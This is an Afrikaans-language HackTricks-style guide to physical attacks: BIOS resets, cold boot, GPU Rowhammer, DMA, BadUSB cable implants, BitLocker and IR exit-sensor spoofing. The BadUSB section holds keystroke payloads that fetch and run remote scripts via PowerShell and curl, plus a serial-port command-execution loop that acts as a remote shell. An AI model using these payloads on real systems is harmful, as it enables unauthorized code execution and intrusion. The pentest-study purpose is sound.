# Fisiese Aanvalle

{{#include ../banners/hacktricks-training.md}}

## BIOS-wagwoordherwinning en Stelselsekuriteit

Verouderde rekenaar-firmware-instellings kan teruggestel word deur die CMOS-battery te ontkoppel of ’n gedokumenteerde clear-CMOS-jumper te gebruik. Die nodige afskakelingstyd hang van die moederbord af, en moderne UEFI-wagwoorde of -sleutels kan in nie-vlugtige flash-geheue, ’n ingebedde beheerder of ’n sekuriteitstoestel gestoor word en dus behoue bly nadat die battery verwyder is. Raadpleeg die moederbord-/dienshandleiding voordat jy penne kortsluit; hierdie prosedure kan ook TPM-metings ongeldig maak en skyf-enkripsieherwinning aktiveer.

Op verouderde x86-stelsels kan nutsprogramme soos **killCMOS** en **CmosPwd** CMOS-gesteunde instellings vanuit ’n selflaaibare omgewing inspekteer of verander. CmosPwd herken wagwoordformate uit ’n gedokumenteerde stel ouer BIOS-families en kan CMOS-status rugsteun, herstel of uitvee/kill; sy gepubliseerde builds is gemik op verouderde DOS/Windows-, Linux-, FreeBSD- en NetBSD-omgewings.<sup>[[18]](#references)</sup> Hierdie nutsprogramme is nie generiese UEFI-wagwoordverwyderaars nie en vereis voldoende hardeware-/firmwaretoegang.

Sommige skootrekenaar-firmware vertoon ’n verskafferspesifieke uitdagingskode ná verskeie mislukte wagwoordpogings. Databasisse soos [bios-pw.org](https://bios-pw.org) kan vir sommige modelle verouderde verskafferherstelwagwoorde aflei, maar baie stelsels implementeer uitsluiting sonder ’n afleibare uitdaging. Behandel enige gegenereerde wagwoord as modelspesifiek en vermy dit om permanente pogingstellers uit te put.

### UEFI-sekuriteit

Vir moderne **UEFI**-stelsels kan CHIPSEC Secure Boot-veranderlikebeskerming oudit. Begin met die nie-wysigende kontrole hieronder; die opsionele `-a modify`-modus probeer doelbewus veranderlikes korrupteer en moet slegs op ’n herstelbare laboratoriumstelsel gebruik word. CHIPSEC waarsku self dat sy bevoorregte drywer en laevlak-hardewaretoegang ongeskik is vir produksie-eindpunte.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM-analise en Cold Boot-aanvalle

DRAM verloor nie elke bis onmiddellik wanneer refresh stop nie. Die vervaltempo wissel aansienlik volgens moduletegnologie en temperatuur; verkoeling kan bruikbare data baie langer bewaar as 'n onverkoelde kragsiklus. 'n Cold-boot-aanval herlaai vinnig na 'n klein acquisition environment of dra 'n verkoelde module oor, vang rou geheue vas en rekonstrueer kriptografiese sleutels ondanks bisverval. 'n Disk-copy utility is nie outomaties 'n physical-memory imager nie, en Volatility ontleed 'n capture eerder as om dit te verkry; gebruik 'n platformgeskikte, gevalideerde acquisition tool.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer teen Page Tables

Moderne GPU Rowhammer-aanvalle word baie nuttiger wanneer hulle **GPU virtual-memory metadata** eerder as gewone buffers teiken. Onlangse werk op **GDDR6 NVIDIA Ampere GPUs** toon dat 'n aanvaller wat ongeprivilegeerde CUDA-kode uitvoer, GPU-spesifieke hammering patterns kan bou, **memory massaging** kan gebruik om paging structures in kwesbare rye te plaas, en dan bisse in die **last-level page table** of 'n intermediêre **page directory** kan omkeer. Sodra 'n enkele translation entry korrupteer is, kan die aanvaller **arbitrary GPU memory read/write** verkry en daarna na host compromise oorskakel.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** in GDDR6 en bou refresh-aware / non-uniform hammering patterns wat in-DRAM-mitigations omseil.
2. **Massage GPU allocations** sodat die driver page-translation structures in hammerable fisiese liggings plaas, eerder as om hulle in die verstek-beskermde pool te hou. In die praktyk kan dit beteken dat die low-memory page-table region uitgeput word en groot sparse UVM mappings met beheerde strides gespuit word.
3. **Flip translation metadata** soos **PFN** of aperture-related bits binne 'n page-table / page-directory entry sodat die aanvallerbeheerde virtuele bladsy na page-table pages, arbitrêre GPU memory of host-visible system mappings verwys.
4. Hergebruik die vervalste mapping om bykomende translation entries te herskryf en eskaleer na **arbitrary GPU memory read/write** oor GPU contexts.

### Host Pivot and Mitigations

- Met **IOMMU disabled** kan vervalste system-aperture mappings arbitrêre **host physical memory** aan die GPU blootstel, wat die GPU-primitief in volledige host compromise verander.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** teiken last-level page-table entries, terwyl **GeForge** toon dat die korrupsie van 'n page-directory-vlak makliker kan wees omdat een bis-omkering 'n groter translation subtree kan herteiken. Moenie slegs een paging layer as security-critical beskou nie.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bly belangrik omdat dit die direkte arbitrary-host-memory-pad blokkeer wat deur GDDRHammer/GeForge gebruik word, maar dit is **not a complete mitigation**. **GPUBreach** toon 'n second-stage pivot waar die aanvaller GPU-writable, driver-owned CPU buffers korrupteer en dan NVIDIA driver memory-safety bugs aktiveer om 'n kernel write primitive en 'n **root shell** te verkry, selfs met IOMMU enabled.<sup>[[3]](#references)</sup>
- **System-level ECC** is 'n praktiese hardening step op ondersteunde workstation/server GPUs. Consumer GPUs sonder ECC stel 'n swakker defense surface bloot.<sup>[[4]](#references)</sup>
- Hierdie aanvalle is nie bloot teoreties nie: **GeForge** het **1,171** bit flips op 'n RTX 3060 en **202** op 'n RTX A6000 gerapporteer, wat genoeg was om 'n werkende host-privilege-escalation chain te bou.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA)-aanvalle

Vir offline UEFI IFR/NVRAM patching wat pre-boot IOMMU enforcement kan downgrade en 'n Windows DMA chain kan aktiveer, sien:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstreer **DMA-based memory acquisition and patching** oor interfaces soos FireWire en vroeë Thunderbolt-konfigurasies, insluitend historiese login-bypass signatures. Dit is nie bloot “ineffective against Windows 10” nie: exploitability hang af van die interface, target build, IOMMU policy, lock state, en of Windows Kernel DMA Protection ondersteun en enabled is. Windows 10 version 1803 en later het Kernel DMA Protection op compatible platforms bekendgestel, wat die attack surface aansienlik verander het.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB vir System Access

Op 'n ongeënkripteerde of reeds-unlocked Windows-volume kan 'n offline environment accessibility binaries soos **sethc.exe** of **Utilman.exe** met **cmd.exe** vervang, wat 'n SYSTEM command prompt lewer wanneer die ooreenstemmende logon-screen shortcut uitgevoer word. Tools soos **chntpw** kan plaaslike SAM-accountdata wysig. Hierdie metodes omseil nie 'n locked BitLocker-volume nie en kan credentials beskadig wat deur DPAPI/EFS beskerm word; bewaar forensiese kopieë en backups.

**Kon-Boot** is 'n kommersiële boot-time authentication-bypass tool vir ondersteunde Windows/macOS-konfigurasies. Compatibility hang af van die OS, firmware mode, Secure Boot en disk-encryption setup; dit decrypt nie 'n BitLocker-locked volume nie.<sup>[[10]](#references)</sup>

---

## Hantering van Windows Security Features

### Boot and Recovery Shortcuts

- **Delete/Supr**, F2, F10 of 'n ander vendor key kan firmware setup oopmaak.
- **F8** gaan legacy Windows advanced boot options binne slegs op konfigurasies waar daardie pad steeds enabled is; huidige recovery entry wissel.
- Om **Shift** in te hou kan Windows automatic logon in sommige konfigurasies onderdruk, hoewel policy/registry-settings daardie gedrag kan disable.<sup>[[17]](#references)</sup>

### BAD USB Devices

Devices soos **USB Rubber Ducky** en Teensy-borde kan as trusted HID-keyboards enumerate en predefined keystrokes inject. Die payload het aanvanklik die privileges en desktop access van die logged-on session; UAC-prompts, screen locking, keyboard layout, timing en endpoint USB-policy beperk dit steeds.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator- of backup-privileges kan 'n shadow copy skep of registry hives stoor sodat locked files soos **SAM** en **SYSTEM** verkry kan word. Dit is 'n post-compromise collection technique, nie 'n privilege bypass nie, en behoort met `diskshadow`/VSS- en registry-hive export-events gekorreleer te word.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3-gebaseerde implants soos **Evil Crow Cable Wind** versteek binne USB-A→USB-C- of USB-C↔USB-C-kabels, enumerate uitsluitlik as 'n USB-keyboard en stel hul C2-stack oor Wi-Fi beskikbaar. Die operator hoef slegs die cable vanaf die victim host te power, 'n hotspot met die naam `Evil Crow Cable Wind` en password `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of sy DHCP-adres) te browse om die embedded HTTP-interface te bereik.<sup>[[8]](#references)</sup>
- Die browser UI verskaf tabs vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* en *Config*. Stored payloads word per OS getag, keyboard layouts word on the fly gewissel, en VID/PID-strings kan verander word om bekende peripherals na te boots.
- Omdat die C2 binne die cable woon, kan 'n phone payloads stage, execution trigger en Wi-Fi credentials manage sonder om die organisasie se network te gebruik—nuttig vir kort dwell-time physical intrusions.

### OS-aware AutoExec payloads

- AutoExec-rules bind een of meer payloads om onmiddellik ná USB-enumeration af te vuur. Die implant voer lightweight OS fingerprinting uit en kies die matching script.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat execution unattended is, kan die eenvoudige omruiling van 'n charging cable “plug-and-pwn” initial access onder die logged-on user context bewerkstellig.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 'n Stored payload open 'n console en plak 'n loop wat enigiets uitvoer wat op die nuwe USB-serial device aankom. 'n Minimale Windows-variant is:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Die implant hou die USB CDC-kanaal oop terwyl sy ESP32-S3 'n TCP-kliënt (Python script, Android APK of desktop executable) terug na die operator begin. Enige grepe wat in die TCP-sessie getik word, word na die serial-lus hierbo aangestuur, wat remote command execution selfs op air-gapped hosts moontlik maak. Uitset is beperk, dus voer operators gewoonlik blinde commands uit (rekening-skepping, staging van addisionele tooling, ens.).

### HTTP OTA update-oppervlak

- Die gedokumenteerde Evil Crow Cable Wind-interface stel 'n unauthenticated firmware-update-endpoint by `/update` bloot:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can features hot-swap (byvoorbeeld flash USB Army Knife-firmware) mid-engagement sonder om die kabel oop te maak, sodat die implantaat na nuwe vermoëns kan oorskakel terwyl dit steeds aan die teikenhost gekoppel is.

## Om BitLocker-enkripsie te omseil

'n Gemagtigde forensiese verkryging van 'n aktiewe of onlangs lopende stelsel kan 'n BitLocker-volumehoofsleutel of verwante sleutelmateriaal bevat terwyl die volume ontsluit is. Kommersiële tools soos Elcomsoft Forensic Disk Decryptor en Passware Kit Forensic kan ondersteunde memory images, hibernation files of crash dumps deursoek, maar sukses is nie gewaarborg nie. Moderne Windows enkripteer ook crash dumps wanneer BitLocker geaktiveer is, en 'n gestoorde 48-syfer recovery password is 'n ander artefak as 'n volume key in die geheue.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering vir die byvoeging van 'n Recovery Key

'n Aanvaller wat 'n administrateur oorreed om BitLocker-management commands uit te voer, kan 'n recovery-password, external-key of ander protector byvoeg en dit daarna vaslê. 'n Recovery password kan nie 'n arbitrêre string van nulle wees nie: BitLocker numerical recovery passwords het 'n gevalideerde 48-syferformaat. Die relevante gemagtigde administration-sintaksis is `manage-bde -protectors -add C: -recoverypassword`; lys die resulterende protectors met `manage-bde -protectors -get C:`. Monitor die byvoeging van protectors en verseker dat nuwe recovery material slegs na goedgekeurde liggings escrow word.<sup>[[16]](#references)</sup>

---

## Ontginning van Chassis Intrusion / Maintenance Switches om die BIOS na fabrieksinstellings terug te stel

Baie moderne laptops en small-form-factor desktops bevat 'n **chassis-intrusion switch** wat deur die Embedded Controller (EC) en die BIOS/UEFI-firmware gemonitor word. Hoewel die primêre doel van die switch is om 'n waarskuwing te genereer wanneer 'n toestel oopgemaak word, implementeer vendors soms 'n **ongedokumenteerde recovery shortcut** wat geaktiveer word wanneer die switch in 'n spesifieke patroon gewissel word.<sup>[[5]](#references)[[6]](#references)</sup>

### Hoe die aanval werk

1. Die switch is aan 'n **GPIO interrupt** op die EC gekoppel.
2. Firmware wat op die EC loop, hou rekord van die **tydsberekening en aantal drukke**.
3. Wanneer 'n hard-coded patroon herken word, roep die EC 'n *mainboard-reset*-roetine aan wat die **inhoud van die stelsel se NVRAM/CMOS uitvee**.
4. Met die volgende boot laai geaffekteerde modelle reset firmware state. Afhangend van die vendor en revision, kan die skoongemaakte state 'n supervisor password, custom boot settings of ingeskakelde Secure Boot keys insluit; TPM-state en disk-encryption-gevolge moet afsonderlik beoordeel word.

> 'n Firmware reset kan external-boot-opsies herstel, maar dit **dekripteer nie storage nie**. BitLocker of 'n ander full-disk encryption-stelsel kan recovery binnegaan ná TPM/firmware-veranderinge en steeds die interne drive sonder 'n recovery key beskerm.<sup>[[16]](#references)</sup>

### Werklike voorbeeld – Framework 13 Laptop

Die recovery shortcut vir die Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Ná die tiende siklus stel die EC ’n vlag wat die BIOS opdrag gee om NVRAM tydens die volgende herselflaai uit te vee. Die hele prosedure neem ongeveer 40 s en vereis **niks meer as ’n skroewedraaier nie**.<sup>[[5]](#references)</sup>

### Algemene Exploitation-prosedure

1. Skakel die teiken aan of hervat dit ná suspendering sodat die EC loop.
2. Verwyder die onderste deksel om die intrusion/maintenance-skakelaar bloot te lê.
3. Herhaal die verskafferspesifieke skakelpatroon (raadpleeg dokumentasie of forums, of reverse-engineer die EC-firmware).
4. Sit die toestel weer aanmekaar en herlaai dit; inspekteer dan watter firmware-instellings en geloofsbriewe werklik verander het.
5. Indien gemagtig en eksterne boot beskikbaar is, boot ’n beheerde live image. Sodra ’n interne volume wettig ontsluit is (of as dit nooit geënkripteer was nie), kan die live environment geloofsbriewe en data bekom of die EFI System Partition inspekteer. Om daardie partisie te wysig om ’n EFI implant te installeer, is persistent en hoogs indringend, en bly beperk deur Secure Boot, measured boot, firmware write protection en endpoint monitoring. Geënkripteerde berging bly ontoeganklik sonder die sleutel of recovery material daarvan.

### Bespeuring & Versagting

* Teken chassis-intrusion-gebeure in die OS management console aan en korreleer dit met onverwagte BIOS-resets.
* Gebruik **seëls wat peutering aandui** op skroewe/deksels om opening te bespeur.
* Hou toestelle in **fisies beheerde gebiede**; aanvaar dat fisiese toegang gelykstaande is aan volledige kompromittering.
* Waar beskikbaar, deaktiveer die verskaffer se “maintenance switch reset”-funksie of vereis addisionele kriptografiese magtiging vir NVRAM-resets.

---

## Covert IR Injection teen No-Touch Exit Sensors

### Sensoreienskappe
- Kommoditeit-“wave-to-exit”-sensors koppel ’n naby-IR-LED-emitter aan ’n TV-afstandbeheer-styl ontvangermodule wat slegs logic high rapporteer nadat dit verskeie pulse (~4–10) van die korrekte draer (≈30 kHz) waargeneem het.<sup>[[7]](#references)</sup>
- ’n Plastiekbedekking keer dat die emitter en ontvanger direk na mekaar kyk, sodat die beheerder aanvaar dat enige gevalideerde draer van ’n nabygeleë refleksie afkomstig is en ’n relay aandryf wat die deursluitplaat oopmaak.
- Sodra die beheerder glo dat ’n teiken teenwoordig is, verander dit dikwels die uitgaande modulasie-omhulsel, maar die ontvanger aanvaar steeds enige burst wat met die gefiltreerde draer ooreenstem.

### Aanvalswerkvloei
1. **Leg die emission profile vas** – koppel ’n logic analyser oor die beheerderpenne om beide die pre-detection- en post-detection-golfvorms op te neem wat die interne IR-LED aandryf.
2. **Replay slegs die “post-detection”-golfvorm** – verwyder/ignoreer die standaardemitter en dryf ’n eksterne IR-LED met die reeds-geaktiveerde patroon vanaf die begin aan. Omdat die ontvanger slegs omgee vir pulstelling/frekwensie, behandel dit die spoofed carrier as ’n egte refleksie en aktiveer dit die relay-lyn.
3. **Gate die transmissie** – stuur die draer in ingestelde bursts (byvoorbeeld tiene millisekondes aan, ongeveer dieselfde tyd af) om die minimum pulstelling te lewer sonder om die ontvanger se AGC of interference-handling logic te versadig. Deurlopende emissie desensitiseer die sensor vinnig en keer dat die relay aktiveer.

### Long-Range Reflective Injection
- Deur die bench-LED met ’n hoëkrag-IR-diode, MOSFET-driver en fokuserende optika te vervang, kan betroubare aktivering van ongeveer 6 m ver verkry word.
- Die aanvaller het nie line-of-sight na die ontvangeropening nodig nie; deur die straal op binnemure, rakke of deurkosyne te rig wat deur glas sigbaar is, kan gereflekteerde energie die ongeveer 30°-sigveld binnedring en ’n nabyafstand-handbeweging naboots.
- Omdat die ontvangers slegs swak refleksies verwag, kan ’n veel sterker eksterne straal van verskeie oppervlaktes af weerkaats en steeds bo die bespeuringsdrempel bly.

### Weaponised Attack Torch
- Deur die driver binne ’n kommersiële flitslig in te bou, word die instrument in die openbaar verberg. Vervang die sigbare LED met ’n hoëkrag-IR-LED wat by die ontvanger se band pas, voeg ’n ATtiny412 (of soortgelyk) by om die ongeveer 30 kHz-bursts te genereer, en gebruik ’n MOSFET om die LED-stroom af te sink.
- ’n Teleskopiese zoomlens vernou die straal vir reikwydte/presisie, terwyl ’n vibrasiemotor onder MCU-beheer haptiese bevestiging gee dat modulasie aktief is sonder om sigbare lig uit te stuur.
- Deur deur verskeie gestoorde modulasiepatrone te siklus (effens verskillende draerfrekwensies en omhulsels), word versoenbaarheid oor herhandelde sensorfamilies verhoog. Dit laat die operateur toe om reflektiewe oppervlaktes te skandeer totdat die relay hoorbaar klik en die deur oopgaan.

---

## References

- [1] [GDDRHammer: Baie ontwrigtende DRAM-rye — Cross-Component Rowhammer-aanvalle vanaf moderne GPU’s](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering van GDDR-geheue om GPU-bladsytabelle vir pret en wins te forge](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation-aanvalle op GPU’s met Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Sekuriteitskennisgewing: Rowhammer - Julie 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Druk hier om te pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Gids vir moederbord-reset](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Om IR No-Touch Exit Sensors met ’n Covert IR Torch te omseil”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking met Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer-aanval teen NVIDIA-skyfies](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot amptelike dokumentasie en versoenbaarheidsinligting](https://kon-boot.com/)
- [11] [CHIPSEC-dokumentasie - Secure Boot-veranderlike-beskerming](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot-aanvalle op enkripsiesleutels](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - fisiese geheuemanipulasie oor DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky-dokumentasie](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker-bedryfs- en bewerkingsgids](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift inhou en outomatiese aanmeldgedrag](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd-dokumentasie en aflaaie](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
